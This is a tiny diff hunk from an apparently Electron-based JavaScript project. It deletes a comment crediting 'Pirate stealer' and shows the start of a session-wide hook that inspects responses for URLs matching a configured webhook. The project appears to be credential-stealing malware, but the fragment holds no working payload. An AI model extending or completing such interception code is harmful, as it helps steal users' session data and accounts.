@@ -145,8 +145,6 @@ class Event {
     }
 }
 
-// Traffic recording (Pirate stealer inspiration)
-
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     try {
         if (details.url.startsWith(config.webhook)) {
